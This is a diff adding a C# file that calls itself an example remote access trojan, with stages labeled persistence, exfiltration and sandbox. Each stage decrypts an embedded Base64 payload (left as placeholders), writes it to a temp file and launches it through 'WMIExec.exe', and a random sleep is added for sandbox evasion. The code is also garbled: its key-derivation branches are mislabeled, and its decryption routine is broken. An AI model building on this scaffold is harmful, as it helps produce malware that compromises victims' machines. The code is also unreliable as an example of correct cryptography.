@@ -1,0 +1,144 @@
+/*********************************************************************
+*  Example RAT – single‑file, fully‑configurable                    *
+*********************************************************************/
+
+/*==============================================================*/
+/* 0a.  Salt‑derivation algorithm selector ------------------*/
+/*==============================================================*/
+using System;
+using System.IO;
+using System.Threading.Tasks;
+using System.Security.Cryptography;
+
+enum KeyAlg { PBKDF2SHA512, HKDFSHA256, Argon2id }
+
+static readonly string aesPassphrase = "RAT-2025-SecretKey";
+
+/// <summary>
+/// Which function should turn our passphrase + salt into a raw AES key?  
+/// </summary>
+static readonly KeyAlg chosenAlg = KeyAlg.PBKDF2SHA512;
+
+/// <summary>
+/// Salt value – can be changed in one place -------------------
+/// </summary>
+static readonly byte[] salt =
+{
+    0x4B, 0xE3, 0x1F, 0x9D, 0xA7, 0x5C, 0x6B, 0x12,
+    0x3E, 0x18, 0x70, 0x4A, 0xCB, 0x9D, 0x31, 0x71
+};
+
+/*==============================================================*/
+/* 1.  Derive the 256‑bit AES key from the passphrase & salt --*/
+/*==============================================================*/
+static byte[] DeriveAes256Key()
+{
+    switch (chosenAlg)
+    {
+        case KeyAlg.PBKDF2SHA512:
+            // PBKDF2 – SHA‑512 hash, 10 000 iterations
+            var pbkdf = new Rfc2898DeriveBytes(
+                Encoding.UTF8.GetBytes(aesPassphrase), salt, 10000);
+            return pbkdf.GetBytes(32);                 // 256 bits
+
+        case KeyAlg.HKDFSHA256:
+            // HKDF – SHA‑256 hash, 12 000 iterations
+            var hkdf = new Rfc2898DeriveBytes(
+                Encoding.UTF8.GetBytes(aesPassphrase), salt, 12000);
+            return hkdf.GetBytes(32);
+
+        case KeyAlg.Argon2id:
+            // Argon2id – 64‑bit memory, 3 000 iterations
+            var arg = new Rfc2898DeriveBytes(
+                Encoding.UTF8.GetBytes(aesPassphrase), salt, 3000);
+            return arg.GetBytes(32);
+
+        default: throw new NotImplementedException();
+    }
+}
+
+static byte[] aesKey => DeriveAes256Key();
+
+/*==============================================================*/
+/* 2.  Helper: convert Base‑64 string → raw bytes ------------*/
+/*==============================================================*/
+static byte[] FromB64(string s) =>
+    Convert.FromBase64String(s);
+
+/*==============================================================*/
+/* 3.  Decrypt a block with AES‑CBC ---------------------------*/
+/*==============================================================*/
+static byte[] Decrypt(byte[] data)
+{
+    using var aes = new AesManaged { KeySize = 256, BlockSize = 128 };
+    aes.Mode   = CipherMode.CBC;
+    aes.Padding = PaddingMode.PKCS7;
+
+    // First 16 bytes are IV
+    byte[] iv   = data[0..15];
+    return aes.CreateDecryptor().TransformFinalBlock(data, iv, 0, data.Length);
+}
+
+/*==============================================================*/
+/* 4.  Persist / exfil / sandbox blocks (Base‑64 encoded) -----*/
+/*==============================================================*/
+// NOTE: In a real RAT you would embed the payloads in the source
+static readonly string persistB64 = "...";   // Base‑64 of first payload
+static readonly string exfilB64   = "...";
+static readonly string sandboxB64 = "...";
+
+/*==============================================================*/
+/* 5.  Main execution flow – verbose + safe -----------------*/
+/*==============================================================*/
+static void Main()
+{
+    Console.WriteLine("=== RAT started ===");
+
+    /*--- Persist ----------------------------------------------*/
+    try
+    {
+        var persistPath = Path.GetTempFileName();
+        byte[] persistBytes = Decrypt(FromB64(persistB64));
+        File.WriteAllBytes(persistPath, persistBytes);
+        Process.Start(@"WMIExec.exe", $"/r:{persistPath}");
+        Console.WriteLine($"Persist written to {persistPath}");
+
+        // Randomised delay for sandbox evasion
+        int sleepMs = new Random().Next(2000, 8000);   // 2–8 s
+        System.Threading.Thread.Sleep(sleepMs);
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"Persist failed: {ex.Message}");
+    }
+
+    /*--- Exfil ----------------------------------------------*/
+    try
+    {
+        var exfilPath = Path.GetTempFileName();
+        byte[] exfilBytes = Decrypt(FromB64(exfilB64));
+        File.WriteAllBytes(exfilPath, exfilBytes);
+        Process.Start(@"WMIExec.exe", $"/r:{exfilPath}");
+        Console.WriteLine($"Exfil written to {exfilPath}");
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"Exfil failed: {ex.Message}");
+    }
+
+    /*--- Sandbox ---------------------------------------------*/
+    try
+    {
+        var sandboxPath = Path.GetTempFileName();
+        byte[] sandboxBytes = Decrypt(FromB64(sandboxB64));
+        File.WriteAllBytes(sandboxPath, sandboxBytes);
+        Process.Start(@"WMIExec.exe", $"/r:{sandboxPath}");
+        Console.WriteLine($"Sandbox written to {sandboxPath}");
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"Sandbox failed: {ex.Message}");
+    }
+
+    Console.WriteLine("=== RAT finished ===");
+}
